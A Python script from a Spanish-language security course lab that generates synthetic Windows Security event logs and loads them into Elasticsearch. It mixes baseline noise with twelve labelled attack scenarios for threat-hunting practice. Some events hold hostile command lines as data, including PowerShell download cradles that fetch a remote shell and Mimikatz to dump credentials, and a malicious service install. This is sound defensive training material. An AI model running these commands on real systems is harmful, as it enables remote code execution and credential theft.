#!/usr/bin/env python3
"""
load_winevt_data.py - Genera y carga Windows Security Events avanzados
Dataset rico con 800+ eventos incluyendo 12 escenarios de ataque sofisticados.
Curso MAR404 - Clase 8 - Lab 16
"""
import json, time, random
from datetime import datetime, timedelta
from elasticsearch import Elasticsearch

ES_HOST = "http://elasticsearch:9200"
INDEX = "windows-security"

def wait_for_es():
    es = Elasticsearch(ES_HOST)
    for i in range(60):
        try:
            if es.ping(): return es
        except: pass
        time.sleep(2)
    raise Exception("ES not available")


def generate_baseline_events(base_time):
    """Genera 500 eventos normales de baseline para crear ruido realista."""
    events = []
    users = ["CORP\\user01", "CORP\\user02", "CORP\\user03", "CORP\\admin",
             "CORP\\svc_backup", "CORP\\svc_sql", "NT AUTHORITY\\SYSTEM"]
    workstations = ["WS-001", "WS-002", "WS-003", "WS-004", "SRV-DC01", "SRV-FILE01"]
    
    # Normal logons (4624) - 250 events
    for i in range(250):
        t = base_time + timedelta(minutes=random.randint(0, 720))
        events.append({
            "event_id": 4624, "event_description": "An account was successfully logged on",
            "timestamp": t.isoformat(),
            "logon_type": random.choice([2, 3, 5, 7, 10]),
            "logon_type_desc": {2:"Interactive",3:"Network",5:"Service",7:"Unlock",10:"RemoteInteractive"}[random.choice([2,3,5,7,10])],
            "target_user": random.choice(users),
            "source_workstation": random.choice(workstations),
            "source_ip": f"10.0.1.{random.randint(10,50)}",
            "hostname": random.choice(workstations),
            "category": "normal", "severity": "info",
            "attack_chain": "baseline"
        })
    
    # Normal logoffs (4634) - 100 events
    for i in range(100):
        t = base_time + timedelta(minutes=random.randint(0, 720))
        events.append({
            "event_id": 4634, "event_description": "An account was logged off",
            "timestamp": t.isoformat(),
            "logon_type": random.choice([2, 3, 7]),
            "target_user": random.choice(users),
            "hostname": random.choice(workstations),
            "category": "normal", "severity": "info",
            "attack_chain": "baseline"
        })
    
    # Normal process creation (4688) - 100 events
    normal_procs = [
        (r"C:\Windows\System32\svchost.exe", "svchost.exe -k netsvcs"),
        (r"C:\Windows\explorer.exe", "explorer.exe"),
        (r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE", "WINWORD.EXE"),
        (r"C:\Windows\System32\notepad.exe", "notepad.exe"),
        (r"C:\Windows\System32\taskmgr.exe", "taskmgr.exe"),
        (r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe"),
    ]
    for i in range(100):
        t = base_time + timedelta(minutes=random.randint(0, 720))
        proc = random.choice(normal_procs)
        events.append({
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": t.isoformat(),
            "new_process_name": proc[0],
            "command_line": proc[1],
            "creator_process_name": r"C:\Windows\System32\services.exe",
            "target_user": random.choice(users),
            "hostname": random.choice(workstations),
            "token_elevation_type": "%%1936",
            "category": "normal", "severity": "info",
            "attack_chain": "baseline"
        })
    
    # Normal scheduled tasks (50 events)
    for i in range(50):
        t = base_time + timedelta(minutes=random.randint(0, 720))
        events.append({
            "event_id": 4698, "event_description": "A scheduled task was created",
            "timestamp": t.isoformat(),
            "task_name": random.choice([r"\Microsoft\Windows\UpdateOrchestrator\Schedule Scan",
                                        r"\Microsoft\Windows\Defrag\ScheduledDefrag",
                                        r"\Microsoft\Windows\DiskCleanup\SilentCleanup"]),
            "target_user": "NT AUTHORITY\\SYSTEM",
            "hostname": random.choice(workstations),
            "category": "normal", "severity": "info",
            "attack_chain": "baseline"
        })
    
    return events


def generate_attack_events(base_time):
    """Genera 12 escenarios de ataque sofisticados."""
    events = []
    
    # === SCENARIO 1: Brute Force + Successful Logon ===
    brute_time = base_time + timedelta(hours=3)
    for i in range(50):
        t = brute_time + timedelta(seconds=random.randint(0, 120))
        events.append({
            "event_id": 4625, "event_description": "An account failed to log on",
            "timestamp": t.isoformat(),
            "logon_type": 3, "logon_type_desc": "Network",
            "failure_reason": "Unknown user name or bad password",
            "sub_status": "0xC000006A",
            "target_user": "CORP\\admin",
            "source_workstation": "KALI-BOX",
            "source_ip": "10.0.1.200",
            "hostname": "SRV-DC01",
            "category": "brute_force", "severity": "high",
            "mitre_technique": "T1110.001", "mitre_tactic": "Credential Access",
            "attack_chain": "brute_force_chain"
        })
    events.append({
        "event_id": 4624, "event_description": "An account was successfully logged on",
        "timestamp": (brute_time + timedelta(minutes=3)).isoformat(),
        "logon_type": 3, "logon_type_desc": "Network",
        "target_user": "CORP\\admin",
        "source_workstation": "KALI-BOX",
        "source_ip": "10.0.1.200",
        "hostname": "SRV-DC01",
        "category": "brute_force_success", "severity": "critical",
        "mitre_technique": "T1110.001", "mitre_tactic": "Credential Access",
        "attack_chain": "brute_force_chain",
        "hunt_note": "Successful logon from same IP after 50 failures in 2 min"
    })
    
    # === SCENARIO 2: Pass-the-Hash ===
    pth_time = base_time + timedelta(hours=5)
    events.append({
        "event_id": 4624, "event_description": "An account was successfully logged on",
        "timestamp": pth_time.isoformat(),
        "logon_type": 9, "logon_type_desc": "NewCredentials",
        "logon_process": "seclogo",
        "authentication_package": "Negotiate",
        "target_user": "CORP\\admin",
        "source_workstation": "WS-001",
        "source_ip": "10.0.1.15",
        "hostname": "WS-001",
        "category": "pass_the_hash", "severity": "critical",
        "mitre_technique": "T1550.002", "mitre_tactic": "Lateral Movement",
        "attack_chain": "pth_chain",
        "hunt_note": "Logon Type 9 + seclogo = Pass-the-Hash indicator"
    })
    events.append({
        "event_id": 4648, "event_description": "A logon was attempted using explicit credentials",
        "timestamp": (pth_time + timedelta(seconds=2)).isoformat(),
        "subject_user": "CORP\\user01",
        "target_user": "CORP\\admin",
        "target_server": "SRV-DC01",
        "process_name": r"C:\Windows\System32\svchost.exe",
        "hostname": "WS-001",
        "category": "pass_the_hash", "severity": "critical",
        "mitre_technique": "T1550.002", "mitre_tactic": "Lateral Movement",
        "attack_chain": "pth_chain",
        "hunt_note": "Explicit credential logon - user01 impersonating admin"
    })
    
    # === SCENARIO 3: Malicious Service Installation ===
    svc_time = base_time + timedelta(hours=6)
    events.append({
        "event_id": 4688, "event_description": "A new process has been created",
        "timestamp": svc_time.isoformat(),
        "new_process_name": r"C:\Windows\System32\sc.exe",
        "command_line": r'sc.exe create WindowsUpdateSvc binPath= "C:\Windows\Temp\svc.exe" start= auto obj= LocalSystem',
        "creator_process_name": r"C:\Windows\System32\cmd.exe",
        "target_user": "CORP\\admin",
        "hostname": "SRV-DC01",
        "token_elevation_type": "%%1937",
        "category": "persistence", "severity": "critical",
        "mitre_technique": "T1543.003", "mitre_tactic": "Persistence",
        "attack_chain": "malicious_service_chain"
    })
    events.append({
        "event_id": 7045, "event_description": "A service was installed in the system",
        "timestamp": (svc_time + timedelta(seconds=1)).isoformat(),
        "service_name": "WindowsUpdateSvc",
        "service_file": r"C:\Windows\Temp\svc.exe",
        "service_type": "user mode service",
        "service_start_type": "auto start",
        "service_account": "LocalSystem",
        "hostname": "SRV-DC01",
        "category": "persistence", "severity": "critical",
        "mitre_technique": "T1543.003", "mitre_tactic": "Persistence",
        "attack_chain": "malicious_service_chain",
        "hunt_note": "Service binary in Temp directory + LocalSystem = malicious"
    })
    events.append({
        "event_id": 4697, "event_description": "A service was installed in the system",
        "timestamp": (svc_time + timedelta(seconds=2)).isoformat(),
        "service_name": "WindowsUpdateSvc",
        "service_file": r"C:\Windows\Temp\svc.exe",
        "subject_user": "CORP\\admin",
        "hostname": "SRV-DC01",
        "category": "persistence", "severity": "critical",
        "mitre_technique": "T1543.003", "mitre_tactic": "Persistence",
        "attack_chain": "malicious_service_chain"
    })
    
    # === SCENARIO 4: Log Tampering (Anti-Forensics) ===
    events.append({
        "event_id": 1102, "event_description": "The audit log was cleared",
        "timestamp": (base_time + timedelta(hours=7)).isoformat(),
        "subject_user": "CORP\\admin",
        "subject_domain": "CORP",
        "hostname": "SRV-DC01",
        "category": "defense_evasion", "severity": "critical",
        "mitre_technique": "T1070.001", "mitre_tactic": "Defense Evasion",
        "attack_chain": "log_tampering_chain",
        "hunt_note": "Security audit log cleared - anti-forensics"
    })
    
    # === SCENARIO 5: Hidden Account Creation ===
    acct_time = base_time + timedelta(hours=5, minutes=30)
    events.append({
        "event_id": 4720, "event_description": "A user account was created",
        "timestamp": acct_time.isoformat(),
        "target_user": "CORP\\svc_update$",
        "subject_user": "CORP\\admin",
        "hostname": "SRV-DC01",
        "category": "persistence", "severity": "high",
        "mitre_technique": "T1136.001", "mitre_tactic": "Persistence",
        "attack_chain": "hidden_account_chain",
        "hunt_note": "Account with $ suffix - hidden from net user"
    })
    events.append({
        "event_id": 4732, "event_description": "A member was added to a security-enabled local group",
        "timestamp": (acct_time + timedelta(seconds=30)).isoformat(),
        "target_user": "CORP\\svc_update$",
        "group_name": "Administrators",
        "subject_user": "CORP\\admin",
        "hostname": "SRV-DC01",
        "category": "privilege_escalation", "severity": "critical",
        "mitre_technique": "T1098", "mitre_tactic": "Privilege Escalation",
        "attack_chain": "hidden_account_chain",
        "hunt_note": "Hidden account added to Administrators group"
    })
    
    # === SCENARIO 6: DLL Injection via Process Creation ===
    dll_time = base_time + timedelta(hours=4)
    events.append({
        "event_id": 4688, "event_description": "A new process has been created",
        "timestamp": dll_time.isoformat(),
        "new_process_name": r"C:\Windows\System32\rundll32.exe",
        "command_line": r'rundll32.exe C:\Users\user01\AppData\Local\Temp\payload.dll,DllMain',
        "creator_process_name": r"C:\Windows\System32\cmd.exe",
        "target_user": "CORP\\user01",
        "hostname": "WS-001",
        "token_elevation_type": "%%1936",
        "category": "execution", "severity": "critical",
        "mitre_technique": "T1218.011", "mitre_tactic": "Defense Evasion",
        "attack_chain": "dll_injection_chain",
        "hunt_note": "rundll32 loading DLL from Temp - classic DLL injection"
    })
    events.append({
        "event_id": 4688, "event_description": "A new process has been created",
        "timestamp": (dll_time + timedelta(seconds=3)).isoformat(),
        "new_process_name": r"C:\Windows\System32\cmd.exe",
        "command_line": r'cmd.exe /c whoami && ipconfig /all',
        "creator_process_name": r"C:\Windows\System32\rundll32.exe",
        "target_user": "CORP\\user01",
        "hostname": "WS-001",
        "category": "discovery", "severity": "high",
        "mitre_technique": "T1059.003", "mitre_tactic": "Execution",
        "attack_chain": "dll_injection_chain",
        "hunt_note": "cmd.exe spawned by rundll32 - post-injection reconnaissance"
    })
    
    # === SCENARIO 7: Kerberoasting ===
    kerb_time = base_time + timedelta(hours=4, minutes=30)
    spns = ["MSSQLSvc/sql01:1433", "HTTP/web01", "CIFS/fs01",
            "MSSQLSvc/sql02:1433", "HTTP/intranet", "FTP/ftp01",
            "LDAP/dc02", "WSMAN/mgmt01"]
    for i, spn in enumerate(spns):
        events.append({
            "event_id": 4769, "event_description": "A Kerberos service ticket was requested",
            "timestamp": (kerb_time + timedelta(seconds=i*2)).isoformat(),
            "target_user": f"svc_{spn.split('/')[0].lower()}",
            "service_name": spn,
            "ticket_encryption": "0x17",
            "ticket_encryption_desc": "RC4-HMAC",
            "source_ip": "10.0.1.15",
            "hostname": "SRV-DC01",
            "category": "credential_access", "severity": "critical",
            "mitre_technique": "T1558.003", "mitre_tactic": "Credential Access",
            "attack_chain": "kerberoasting_chain",
            "hunt_note": f"TGS request with RC4 encryption for SPN: {spn}"
        })
    
    # === SCENARIO 8: Lateral Movement via RDP ===
    rdp_time = base_time + timedelta(hours=6, minutes=30)
    targets = [("SRV-FILE01", "10.0.1.30"), ("SRV-DC01", "10.0.1.1"), ("WS-003", "10.0.1.23")]
    for i, (host, ip) in enumerate(targets):
        events.append({
            "event_id": 4624, "event_description": "An account was successfully logged on",
            "timestamp": (rdp_time + timedelta(minutes=i*5)).isoformat(),
            "logon_type": 10, "logon_type_desc": "RemoteInteractive",
            "target_user": "CORP\\admin",
            "source_workstation": "WS-001",
            "source_ip": "10.0.1.15",
            "hostname": host,
            "category": "lateral_movement", "severity": "high",
            "mitre_technique": "T1021.001", "mitre_tactic": "Lateral Movement",
            "attack_chain": "rdp_lateral_chain",
            "hunt_note": f"RDP lateral movement to {host} from compromised workstation"
        })
    
    # === SCENARIO 9: PowerShell Abuse ===
    ps_time = base_time + timedelta(hours=5, minutes=45)
    events.append({
        "event_id": 4688, "event_description": "A new process has been created",
        "timestamp": ps_time.isoformat(),
        "new_process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "command_line": r'powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAnACkA',
        "creator_process_name": r"C:\Windows\System32\cmd.exe",
        "target_user": "CORP\\user01",
        "hostname": "WS-001",
        "token_elevation_type": "%%1936",
        "category": "execution", "severity": "critical",
        "mitre_technique": "T1059.001", "mitre_tactic": "Execution",
        "attack_chain": "powershell_abuse_chain",
        "hunt_note": "Encoded PowerShell - decodes to: iex (new-object net.webclient).downloadstring('http://192.168.1.100/shell')"
    })
    events.append({
        "event_id": 4688, "event_description": "A new process has been created",
        "timestamp": (ps_time + timedelta(seconds=5)).isoformat(),
        "new_process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "command_line": r'powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.0.1.200:8080/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"',
        "creator_process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "target_user": "CORP\\user01",
        "hostname": "WS-001",
        "category": "credential_access", "severity": "critical",
        "mitre_technique": "T1059.001", "mitre_tactic": "Execution",
        "attack_chain": "powershell_abuse_chain",
        "hunt_note": "In-memory Mimikatz execution via PowerShell cradle"
    })
    
    # === SCENARIO 10: Scheduled Task Persistence ===
    task_time = base_time + timedelta(hours=6, minutes=15)
    events.append({
        "event_id": 4698, "event_description": "A scheduled task was created",
        "timestamp": task_time.isoformat(),
        "task_name": r"\Microsoft\Windows\SystemRestore\SR",
        "task_content": r'<Exec><Command>C:\Windows\Temp\update.exe</Command><Arguments>-silent</Arguments></Exec>',
        "target_user": "NT AUTHORITY\\SYSTEM",
        "subject_user": "CORP\\admin",
        "hostname": "WS-001",
        "category": "persistence", "severity": "critical",
        "mitre_technique": "T1053.005", "mitre_tactic": "Persistence",
        "attack_chain": "schtask_persistence_chain",
        "hunt_note": "Scheduled task masquerading as SystemRestore, binary in Temp"
    })
    events.append({
        "event_id": 4688, "event_description": "A new process has been created",
        "timestamp": (task_time + timedelta(hours=1)).isoformat(),
        "new_process_name": r"C:\Windows\Temp\update.exe",
        "command_line": r"C:\Windows\Temp\update.exe -silent",
        "creator_process_name": r"C:\Windows\System32\svchost.exe",
        "target_user": "NT AUTHORITY\\SYSTEM",
        "hostname": "WS-001",
        "category": "execution", "severity": "critical",
        "mitre_technique": "T1053.005", "mitre_tactic": "Execution",
        "attack_chain": "schtask_persistence_chain",
        "hunt_note": "Scheduled task executed - binary from Temp running as SYSTEM"
    })
    
    # === SCENARIO 11: DCSync Attack ===
    dc_time = base_time + timedelta(hours=7, minutes=30)
    events.append({
        "event_id": 4662, "event_description": "An operation was performed on an object",
        "timestamp": dc_time.isoformat(),
        "subject_user": "CORP\\admin",
        "object_type": "domainDNS",
        "object_name": "DC=corp,DC=local",
        "access_mask": "0x100",
        "properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",
        "hostname": "SRV-DC01",
        "category": "credential_access", "severity": "critical",
        "mitre_technique": "T1003.006", "mitre_tactic": "Credential Access",
        "attack_chain": "dcsync_chain",
        "hunt_note": "DS-Replication-Get-Changes - DCSync from non-DC machine"
    })
    events.append({
        "event_id": 4662, "event_description": "An operation was performed on an object",
        "timestamp": (dc_time + timedelta(seconds=1)).isoformat(),
        "subject_user": "CORP\\admin",
        "object_type": "domainDNS",
        "object_name": "DC=corp,DC=local",
        "access_mask": "0x100",
        "properties": "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}",
        "hostname": "SRV-DC01",
        "category": "credential_access", "severity": "critical",
        "mitre_technique": "T1003.006", "mitre_tactic": "Credential Access",
        "attack_chain": "dcsync_chain",
        "hunt_note": "DS-Replication-Get-Changes-All - confirms DCSync"
    })
    
    # === SCENARIO 12: Data Exfiltration via SMB ===
    exfil_time = base_time + timedelta(hours=8)
    events.append({
        "event_id": 5145, "event_description": "A network share object was checked",
        "timestamp": exfil_time.isoformat(),
        "subject_user": "CORP\\admin",
        "share_name": r"\\*\C$",
        "share_path": "C:\\",
        "relative_target": r"Users\admin\Documents\confidential",
        "access_mask": "0x12019F",
        "source_ip": "10.0.1.15",
        "hostname": "SRV-FILE01",
        "category": "exfiltration", "severity": "critical",
        "mitre_technique": "T1039", "mitre_tactic": "Collection",
        "attack_chain": "exfiltration_chain",
        "hunt_note": "Admin share (C$) access to confidential directory"
    })
    for i in range(5):
        events.append({
            "event_id": 5145, "event_description": "A network share object was checked",
            "timestamp": (exfil_time + timedelta(seconds=10+i*5)).isoformat(),
            "subject_user": "CORP\\admin",
            "share_name": r"\\*\C$",
            "share_path": "C:\\",
            "relative_target": f"Users\\admin\\Documents\\confidential\\file_{i}.xlsx",
            "access_mask": "0x12019F",
            "source_ip": "10.0.1.15",
            "hostname": "SRV-FILE01",
            "category": "exfiltration", "severity": "high",
            "mitre_technique": "T1039", "mitre_tactic": "Collection",
            "attack_chain": "exfiltration_chain",
            "hunt_note": f"File accessed via admin share: file_{i}.xlsx"
        })
    
    return events


def main():
    es = wait_for_es()
    
    mapping = {
        "mappings": {
            "properties": {
                "timestamp": {"type": "date"},
                "event_id": {"type": "integer"},
                "event_description": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "logon_type": {"type": "integer"},
                "logon_type_desc": {"type": "keyword"},
                "logon_process": {"type": "keyword"},
                "authentication_package": {"type": "keyword"},
                "target_user": {"type": "keyword"},
                "subject_user": {"type": "keyword"},
                "source_ip": {"type": "ip"},
                "source_workstation": {"type": "keyword"},
                "hostname": {"type": "keyword"},
                "new_process_name": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "command_line": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "creator_process_name": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "service_name": {"type": "keyword"},
                "service_file": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "service_account": {"type": "keyword"},
                "task_name": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "group_name": {"type": "keyword"},
                "share_name": {"type": "keyword"},
                "relative_target": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "ticket_encryption": {"type": "keyword"},
                "service_name_spn": {"type": "keyword"},
                "category": {"type": "keyword"},
                "severity": {"type": "keyword"},
                "mitre_technique": {"type": "keyword"},
                "mitre_tactic": {"type": "keyword"},
                "attack_chain": {"type": "keyword"},
                "hunt_note": {"type": "text"},
                "simulated": {"type": "boolean"},
                "simulated_at": {"type": "date"},
            }
        }
    }
    
    es.indices.delete(index=INDEX, ignore=[404])
    es.indices.create(index=INDEX, body=mapping)
    
    base_time = datetime(2025, 7, 21, 6, 0, 0)
    
    # Generate all events
    baseline = generate_baseline_events(base_time)
    attacks = generate_attack_events(base_time)
    all_events = baseline + attacks
    
    for event in all_events:
        es.index(index=INDEX, document=event)
    
    es.indices.refresh(index=INDEX)
    
    print(f"\n{'='*60}")
    print(f"  LAB 16 - Dataset cargado exitosamente")
    print(f"{'='*60}")
    print(f"  Total eventos: {len(all_events)}")
    print(f"  Baseline (normales): {len(baseline)}")
    print(f"  Ataques: {len(attacks)}")
    print(f"  Index: {INDEX}")
    print(f"\n  Escenarios de ataque incluidos:")
    print(f"    1. Brute Force + Successful Logon (T1110.001)")
    print(f"    2. Pass-the-Hash (T1550.002)")
    print(f"    3. Malicious Service Installation (T1543.003)")
    print(f"    4. Log Tampering / Anti-Forensics (T1070.001)")
    print(f"    5. Hidden Account Creation (T1136.001)")
    print(f"    6. DLL Injection via rundll32 (T1218.011)")
    print(f"    7. Kerberoasting (T1558.003)")
    print(f"    8. RDP Lateral Movement (T1021.001)")
    print(f"    9. PowerShell Abuse / Mimikatz (T1059.001)")
    print(f"   10. Scheduled Task Persistence (T1053.005)")
    print(f"   11. DCSync Attack (T1003.006)")
    print(f"   12. Data Exfiltration via SMB (T1039)")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
